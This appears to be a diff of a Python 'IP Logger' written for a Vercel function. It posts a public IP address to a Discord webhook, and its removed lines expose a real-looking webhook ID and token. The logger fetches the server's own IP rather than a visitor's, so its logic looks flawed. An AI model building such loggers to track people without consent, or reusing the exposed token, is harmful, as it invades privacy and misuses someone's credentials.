@@ -1,19 +1,12 @@
 #!/usr/bin/env python3
-"""
-IP Logger with Discord Webhook Delivery
-Requires: requests library (pip install requests)
-"""
-
 import requests
 import json
 import sys
 from datetime import datetime
 
-# CONFIGURATION - Replace with your actual Discord webhook URL
-WEBHOOK_URL = "https://discord.com/api/webhooks/1545661015440498791/tQ91781PFgjdaANmpjXDiGI21sHrV_In5B0qkb9VEW5j2gZlP3QwIx6JOv_ZtGSKqT6g"
+WEBHOOK_URL = "https://discord.com/api/webhooks/your_id/your_token"
 
 def get_public_ip():
-    """Retrieve public IPv4 address using ipify API."""
     try:
         response = requests.get("https://api.ipify.org?format=json", timeout=5)
         response.raise_for_status()
@@ -23,7 +16,6 @@ def get_public_ip():
         return None
 
 def build_discord_payload(ip_address):
-    """Construct embed message for Discord."""
     timestamp = datetime.utcnow().isoformat() + "Z"
     return {
         "embeds": [{
@@ -38,7 +30,6 @@ def build_discord_payload(ip_address):
     }
 
 def send_to_discord(payload):
-    """POST payload to Discord webhook."""
     headers = {"Content-Type": "application/json"}
     try:
         response = requests.post(WEBHOOK_URL, data=json.dumps(payload), headers=headers, timeout=10)
@@ -48,9 +39,7 @@ def send_to_discord(payload):
         print(f"Discord send error: {e}", file=sys.stderr)
         return False
 
-# Vercel entry point - MUST be named 'handler'
 def handler(request):
-    """Vercel serverless function handler."""
     ip = get_public_ip()
     if not ip:
         return {"statusCode": 500, "body": "Failed to get IP"}
